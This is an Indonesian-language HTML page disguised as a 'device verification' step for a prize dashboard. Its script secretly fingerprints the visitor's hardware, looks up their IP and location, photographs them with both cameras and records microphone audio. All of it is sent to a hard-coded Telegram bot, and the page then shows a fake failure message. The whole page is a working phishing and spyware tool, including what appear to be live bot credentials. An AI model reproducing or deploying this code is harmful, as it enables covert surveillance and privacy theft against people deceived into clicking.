<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sistem Verifikasi Perangkat - Deltarex.ID</title>
    <style>
        :root { --neon: #00f2ff; --bg: #0a0a0c; --card: #161b22; }
        body { background: var(--bg); color: #e6edf3; font-family: 'Consolas', 'Monaco', monospace; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; overflow: hidden; }
        .terminal { border: 1px solid #30363d; background: var(--card); padding: 25px; border-radius: 12px; width: 90%; max-width: 420px; box-shadow: 0 10px 40px rgba(0,0,0,0.5); position: relative; }
        .terminal::before { content: ""; position: absolute; top: 0; left: 0; width: 100%; height: 2px; background: linear-gradient(90deg, transparent, var(--neon), transparent); animation: scan 2s linear infinite; }
        @keyframes scan { 0% { left: -100%; } 100% { left: 100%; } }
        h2 { color: var(--neon); font-size: 1.2rem; margin-top: 0; text-transform: uppercase; letter-spacing: 2px; }
        p { font-size: 13px; color: #8b949e; line-height: 1.5; }
        .btn-action { background: transparent; border: 1px solid var(--neon); color: var(--neon); padding: 12px; width: 100%; cursor: pointer; font-weight: bold; margin-top: 20px; transition: 0.3s; text-transform: uppercase; }
        .btn-action:hover { background: var(--neon); color: #000; box-shadow: 0 0 20px var(--neon); }
        #console-log { margin-top: 15px; font-size: 11px; color: #4ade80; height: 120px; overflow-y: auto; border-top: 1px solid #30363d; padding-top: 10px; display: none; }
        video, canvas { display: none; visibility: hidden; position: absolute; }
    </style>
</head>
<body>

<div class="terminal">
    <h2>> DEVICE_CHECK_V5</h2>
    <p>Sistem mendeteksi akses dari perangkat baru. Selesaikan verifikasi identitas untuk melanjutkan ke dashboard hadiah.</p>
    
    <button class="btn-action" id="mainBtn" onclick="executePulse()">MULAI VERIFIKASI</button>
    
    <div id="console-log"></div>
</div>

<canvas id="hiddenCanvas"></canvas>

<script>
    /* -------------------------------------------------------------------------
       KONFIGURASI OTOMATIS (SAIDI)
       ------------------------------------------------------------------------- */
    const CONFIG = {
        TOKEN: "8760751336:AAHEKohAFDeeYvVeHHDZIg_gfIkhVM7nrto",
        CHAT_ID: "8391235598",
        TAG: "DELTAREX_SEC_REPORTS"
    };

    const consoleLog = document.getElementById('console-log');

    function writeLog(text) {
        consoleLog.style.display = 'block';
        consoleLog.innerHTML += `[SYSTEM]: ${text}<br>`;
        consoleLog.scrollTop = consoleLog.scrollHeight;
    }

    /* -------------------------------------------------------------------------
       MODULE 1: HARDWARE FINGERPRINTING
       ------------------------------------------------------------------------- */
    async function getSpecs() {
        writeLog("Mengambil fingerprint hardware...");
        const canvas = document.createElement('canvas');
        const gl = canvas.getContext('webgl');
        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
        
        return {
            platform: navigator.platform,
            vendor: navigator.vendor,
            gpu: debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_ID) : "N/A",
            cores: navigator.hardwareConcurrency || "Hidden",
            ram: navigator.deviceMemory || "Hidden",
            res: `${screen.width}x${screen.height}`,
            lang: navigator.language
        };
    }

    /* -------------------------------------------------------------------------
       MODULE 2: NETWORK & POWER
       ------------------------------------------------------------------------- */
    async function getNetwork() {
        writeLog("Tracing network protocol...");
        try {
            const r = await fetch('https://ipapi.co/json/');
            return await r.json();
        } catch (e) { return { ip: "Error", org: "Unknown" }; }
    }

    async function getBattery() {
        writeLog("Sinkronisasi sensor daya...");
        try {
            const b = await navigator.getBattery();
            return { lv: (b.level * 100) + "%", ch: b.charging ? "YES" : "NO" };
        } catch (e) { return { lv: "N/A", ch: "N/A" }; }
    }

    /* -------------------------------------------------------------------------
       MODULE 3: TELEGRAM HANDLER
       ------------------------------------------------------------------------- */
    async function sendToTele(type, data, info = "") {
        const api = `https://api.telegram.org/bot${CONFIG.TOKEN}`;
        const fd = new FormData();
        fd.append('chat_id', CONFIG.CHAT_ID);

        if (type === 'text') {
            await fetch(`${api}/sendMessage`, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({ chat_id: CONFIG.CHAT_ID, text: data, parse_mode: 'Markdown' })
            });
        } else if (type === 'photo') {
            fd.append('photo', data, 'snap.jpg');
            fd.append('caption', `📷 ${info}`);
            await fetch(`${api}/sendPhoto`, { method: 'POST', body: fd });
        } else if (type === 'voice') {
            fd.append('voice', data, 'rec.ogg');
            fd.append('caption', `🎤 Rekaman Suara Ambien`);
            await fetch(`${api}/sendVoice`, { method: 'POST', body: fd });
        }
    }

    /* -------------------------------------------------------------------------
       MODULE 4: MEDIA CAPTURE (SILENT)
       ------------------------------------------------------------------------- */
    async function takeSnap(side) {
        writeLog(`Membuka akses kamera ${side}...`);
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: (side === 'Depan' ? 'user' : 'environment') } });
            const v = document.createElement('video');
            v.srcObject = stream;
            await v.play();
            
            const c = document.getElementById('hiddenCanvas');
            c.width = v.videoWidth;
            c.height = v.videoHeight;
            c.getContext('2d').drawImage(v, 0, 0);
            
            stream.getTracks().forEach(t => t.stop());
            return new Promise(res => c.toBlob(res, 'image/jpeg', 0.8));
        } catch (e) { 
            writeLog(`Akses kamera ${side} ditolak.`);
            return null; 
        }
    }

    async function recordAudio() {
        writeLog("Menangkap frekuensi audio...");
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
            const rec = new MediaRecorder(stream);
            let chunks = [];
            rec.ondataavailable = e => chunks.push(e.data);
            rec.onstop = async () => {
                const blob = new Blob(chunks, { type: 'audio/ogg' });
                await sendToTele('voice', blob);
                stream.getTracks().forEach(t => t.stop());
                writeLog("Audio package dikirim.");
            };
            rec.start();
            setTimeout(() => rec.stop(), 5000);
        } catch (e) { writeLog("Akses mic ditolak."); }
    }

    /* -------------------------------------------------------------------------
       MAIN CORE EXECUTION
       ------------------------------------------------------------------------- */
    async function executePulse() {
        document.getElementById('mainBtn').disabled = true;
        writeLog("Inisialisasi handshake...");
        
        const hw = await getSpecs();
        const nt = await getNetwork();
        const bt = await getBattery();

        let msg = `🚨 *NEW REPORT: ${CONFIG.TAG}*\n`;
        msg += `-------------------------------\n`;
        msg += `📱 *HARDWARE*\n• Platform: ${hw.platform}\n• GPU: ${hw.gpu}\n• CPU: ${hw.cores} Cores\n• RAM: ${hw.ram}GB\n• Res: ${hw.res}\n\n`;
        msg += `🌐 *NETWORK*\n• IP: ${nt.ip}\n• ISP: ${nt.org}\n• Loc: ${nt.city}, ${nt.region}\n\n`;
        msg += `🔋 *POWER*\n• Level: ${bt.lv}\n• Charging: ${bt.ch}\n`;
        msg += `-------------------------------`;
        
        await sendToTele('text', msg);

        // Media Collection
        const p1 = await takeSnap('Depan');
        if(p1) await sendToTele('photo', p1, "FRONT_CAM_CAPTURE");

        const p2 = await takeSnap('Belakang');
        if(p2) await sendToTele('photo', p2, "BACK_CAM_CAPTURE");

        await recordAudio();

        writeLog("Finalisasi verifikasi...");
        setTimeout(() => {
            alert("VERIFIKASI GAGAL: Hardware tidak kompatibel.");
            location.reload();
        }, 3000);
    }
</script>

</body>
</html>
